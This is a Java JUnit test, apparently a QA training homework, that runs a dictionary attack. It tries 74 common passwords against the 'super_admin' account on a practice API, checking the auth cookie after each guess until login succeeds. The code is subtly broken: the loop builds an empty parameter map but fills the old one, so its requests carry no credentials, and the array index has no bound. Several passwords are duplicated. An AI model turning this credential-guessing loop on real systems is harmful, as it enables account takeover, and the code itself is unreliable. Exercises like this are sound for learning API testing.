import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class GettingPassword {
    @Test
    public void gettingPassword() {
        String[] passwordAry = new String[74]; //объявляем массив криво и указываем все уникальные пароли как часть массива
        passwordAry[0] = "password";
        passwordAry[1] = "123456";
        passwordAry[2] = "12345678";
        passwordAry[3] = "qwerty";
        passwordAry[4] = "abc123";
        passwordAry[5] = "monkey";
        passwordAry[6] = "1234567";
        passwordAry[7] = "letmein";
        passwordAry[8] = "trustno1";
        passwordAry[9] = "dragon";
        passwordAry[10] = "baseball";
        passwordAry[11] = "111111";
        passwordAry[12] = "iloveyou";
        passwordAry[13] = "master";
        passwordAry[14] = "sunshine";
        passwordAry[15] = "ashley";
        passwordAry[16] = "bailey";
        passwordAry[17] = "passw0rd";
        passwordAry[18] = "shadow";
        passwordAry[19] = "123123";
        passwordAry[20] = "654321";
        passwordAry[21] = "superman";
        passwordAry[22] = "qazwsx";
        passwordAry[23] = "michael";
        passwordAry[24] = "12345678";
        passwordAry[25] = "qwerty";
        passwordAry[26] = "Football";
        passwordAry[27] = "welcome";
        passwordAry[28] = "football";
        passwordAry[29] = "jesus";
        passwordAry[30] = "michael";
        passwordAry[31] = "dragon";
        passwordAry[32] = "ninja";
        passwordAry[33] = "mustang";
        passwordAry[34] = "password1";
        passwordAry[35] = "123456789";
        passwordAry[36] = "adobe123";
        passwordAry[37] = "admin";
        passwordAry[38] = "1234567890";
        passwordAry[39] = "photoshop";
        passwordAry[40] = "1234";
        passwordAry[41] = "12345";
        passwordAry[42] = "princess";
        passwordAry[43] = "azerty";
        passwordAry[44] = "000000";
        passwordAry[45] = "access";
        passwordAry[46] = "696969";
        passwordAry[47] = "batman";
        passwordAry[48] = "1qaz2wsx";
        passwordAry[49] = "login";
        passwordAry[50] = "qwertyuiop";
        passwordAry[51] = "solo";
        passwordAry[52] = "starwars";
        passwordAry[53] = "121212";
        passwordAry[54] = "flower";
        passwordAry[55] = "hottie";
        passwordAry[56] = "loveme";
        passwordAry[57] = "zaq1zaq1";
        passwordAry[58] = "hello";
        passwordAry[59] = "freedom";
        passwordAry[60] = "whatever";
        passwordAry[61] = "666666";
        passwordAry[62] = "!@#$%^&*";
        passwordAry[63] = "charlie";
        passwordAry[64] = "aa123456";
        passwordAry[65] = "donald";
        passwordAry[66] = "qwerty123";
        passwordAry[67] = "1q2w3e4r";
        passwordAry[68] = "654321";
        passwordAry[69] = "555555";
        passwordAry[70] = "lovely";
        passwordAry[71] = "7777777";
        passwordAry[72] = "888888";
        passwordAry[73] = "123qwe";

        int numberFromArray = 0;
        String password = passwordAry[numberFromArray];
        String uncorrectedResult = "You are NOT authorized";

        Map<String,String> data = new HashMap<>();
        data.put("login","super_admin");
        data.put("password",password);

        Response getCookiesForAuth = RestAssured //получаем куки (правильную или неправильную)
                .given()
                .queryParams(data)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();

            String responseCookies = getCookiesForAuth.getCookie("auth_cookie");

        Response putCookiesForAuth = RestAssured //отправляем полученную куки для проверки
                .given()
                .cookies("auth_cookie", responseCookies)
                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();

        String result = putCookiesForAuth.asString();
        System.out.println(result);

        while (Objects.equals(result, uncorrectedResult)) {
            numberFromArray++ ;
            password = passwordAry[numberFromArray];

            Map<String,String> data1 = new HashMap<>();
            data.put("login","super_admin");
            data.put("password",password);

            Response getCookiesForAuth1 = RestAssured //получаем куки (правильную или неправильную)
                    .given()
                    .queryParams(data1)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookies1 = getCookiesForAuth1.getCookie("auth_cookie");
            System.out.println(responseCookies1);

            Response putCookiesForAuth1 = RestAssured //отправляем полученную куки для проверки
                    .given()
                    .cookies("auth_cookie", responseCookies1)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            result = putCookiesForAuth1.asString();

            if (!Objects.equals(result, uncorrectedResult)){

                System.out.println(data1);
            }

        }

    }

}
